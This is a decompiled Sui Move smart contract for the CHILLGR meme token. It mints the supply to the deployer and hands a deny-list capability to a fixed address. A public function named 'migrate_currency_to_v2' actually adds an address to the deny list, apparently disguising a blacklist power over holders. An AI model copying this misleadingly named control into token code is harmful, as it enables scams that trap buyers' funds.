module 0xe198673b489ca75dbeb36a7c9696e91c88e57df5d206901cbb17c7e8ff2d6d1f::chillgr {
    struct CHILLGR has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<CHILLGR>, arg1: 0x2::coin::Coin<CHILLGR>) {
        0x2::coin::burn<CHILLGR>(arg0, arg1);
    }

    fun init(arg0: CHILLGR, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLGR>(arg0, 9, b"CHILLGR", b"CHILLGRINCH", b"I'm not spoiling the holiday, I'm filling it with alcohol", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/61trovNRXxwEyDraZnyZA1U1XW5anmug5DjjDLR7pump.png?size=xl&key=a390d9")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLGR>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLGR>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLGR>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLGR>>(v1, @0x51109d190acb168019f395739ceb188ac699f7acba84b80980ae1413c3837fc0);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGR>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLGR>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<CHILLGR>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<CHILLGR>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

